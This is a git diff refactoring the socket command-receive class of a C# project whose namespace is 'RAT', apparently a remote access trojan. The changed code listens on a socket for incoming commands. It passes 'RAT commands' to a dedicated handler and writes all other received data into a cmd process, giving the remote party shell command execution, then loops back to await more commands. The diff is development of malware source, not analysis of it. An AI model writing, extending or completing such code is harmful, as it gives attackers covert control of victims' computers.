@@ -4,7 +4,7 @@ using System;
 using System.Net.Sockets;
 using System.Text;
 
-namespace RAT.src.Sockets.Connection
+namespace RAT.src.Logic.Sockets.Connection
 {
     /// <summary>
     /// Handles client connection stage over socket.
@@ -32,24 +32,34 @@ namespace RAT.src.Sockets.Connection
         }
 
         /// <summary>
+        /// Wrapper for initial command receive, any command receive starts from here.
+        /// </summary>
+        /// <param name="socket">Our connection.</param>
+        public void BeginCommandReceive(Socket socket)
+        {
+            var clientState = _socketStateLogic.State;
+            socket.BeginReceive(clientState.DataArray, 0, clientState.DataArray.Length, 0, OnCommandReceive, clientState);
+        }
+
+        /// <summary>
         /// Socket receival logic handling.
         /// </summary>
         /// <param name="res">Status of asynchronous operation.</param>
-        public void OnReceive(IAsyncResult res)
+        private void OnCommandReceive(IAsyncResult res)
         {
             // Read data from the client socket.
-            (Socket socket, StateObject state) = _socketStateLogic.GetSocketAndStateFromAsyncResult(res);
+            StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);
 
             int bytesRead = 0;
             try
             {
-                bytesRead = socket.EndReceive(res);
+                bytesRead = state.ClientSocket.EndReceive(res);
             }
             catch (SocketException)
             {
                 // If some error occured during receival, then we are disconnecting client but preserving socket and connection,
                 // so he could connect again immediately (in case if some error occured on his side).
-                socket.BeginDisconnect(reuseSocket: true, _socketConnectionDisconnectLogic.OnDisconnect, state);
+                _socketConnectionDisconnectLogic.DisconnectFromMainSocket(state.ClientSocket);
                 return;
             }
 
@@ -66,35 +76,40 @@ namespace RAT.src.Sockets.Connection
             if (!content.Contains("\n") && content.Contains("<EOF>"))
             {
                 // Not all data received. Get more.
-                socket.BeginReceive(state.DataArray, 0, state.DataArray.Length, 0, OnReceive, state);
+                this.BeginCommandReceive(state.ClientSocket);
             }
             else
             {
-                // Check if this is RAT related command
-                if (_ratCommandLogic.IsRatCommand(_socketStateLogic.State.DataBuilder.ToString()))
-                {
-                    // Fill here after refactoring
-                }
-                else
-                {
-                    // If this is not RAT command, then execute cmd command.
-                    _socketStateLogic.State.ClientCmdProcess.StandardInput.WriteLine(
-                        Encoding.Default.GetString(state.DataArray));
+                this.HandleClientRequest(state);
+            }
+        }
 
-                    // Clear state data after command execution.
-                    state.DataBuilder.Clear(); // Command is stored here in string format.
-                    state.DataArray = new byte[1024]; // Command is stored here in byte command.
-                }
+        /// <summary>
+        /// Handles client request, which can contain command or something else (other non-command data, i.e file data).
+        /// </summary>
+        /// <param name="clientState">Current client state.</param>
+        private void HandleClientRequest(StateObject clientState)
+        {
+            var potentialCommand = clientState.DataBuilder.ToString();
+
+            // Check if this is RAT related command
+            if (_ratCommandLogic.IsRatCommand(potentialCommand))
+            {
+                _ratCommandLogic.HandleRatCommand(potentialCommand);
+            }
+            else
+            {
+                // If this is not RAT command, then execute cmd command.
+                clientState.ClientCmdProcess.StandardInput.WriteLine(
+                    Encoding.Default.GetString(clientState.DataArray));
             }
 
+            // Clear state data after command execution.
+            clientState.DataBuilder.Clear(); // Command is stored here in string format.
+            clientState.DataArray = new byte[1024]; // Command is stored here in byte command.
+
             // Continue on listening for other commands.
-            socket.BeginReceive(
-                state.DataArray,
-                0,
-                state.DataArray.Length,
-                SocketFlags.None,
-                OnReceive,
-                socket);
+            this.BeginCommandReceive(clientState.ClientSocket);
         }
     }
 }
